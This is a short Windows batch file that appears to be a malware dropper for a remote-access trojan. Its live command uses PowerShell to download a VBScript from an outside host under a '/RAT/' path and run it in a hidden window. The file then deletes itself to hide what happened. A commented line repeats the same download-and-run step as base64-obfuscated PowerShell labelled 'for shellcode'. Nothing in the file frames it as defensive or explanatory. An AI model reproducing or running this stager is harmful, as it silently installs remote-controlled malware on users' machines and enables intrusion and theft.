@echo off

powershell "(New-Object System.Net.WebClient).DownloadFile('https://arth.imbeddex.com/RAT/module_downloader.vbs', 'module_downloader.vbs'); Start-Process cmd.exe -ArgumentList '/c', '%~dp0\module_downloader.vbs' -WindowStyle Hidden" & del "%~f0"

:: for shellcode
:: powershell.exe -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGEAcgB0AGgALgBpAG0AYgBlAGQAZABlAHgALgBjAG8AbQAvAFIAQQBUAC8AbQBvAGQAdQBsAGUAXwBkAG8AdwBuAGwAbwBhAGQAZQByAC4AYwBtAGQAJwAsACAAJwBtAG8AZAB1AGwAZQBfAGQAbwB3AG4AbABvAGEAZABlAHIALgBjAG0AZAAnACkAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABjAG0AZAAuAGUAeABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACcALwBjACcALAAgACcAbQBvAGQAdQBsAGUAXwBkAG8AdwBuAGwAbwBhAGQAZQByAC4AYwBtAGQAJwAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A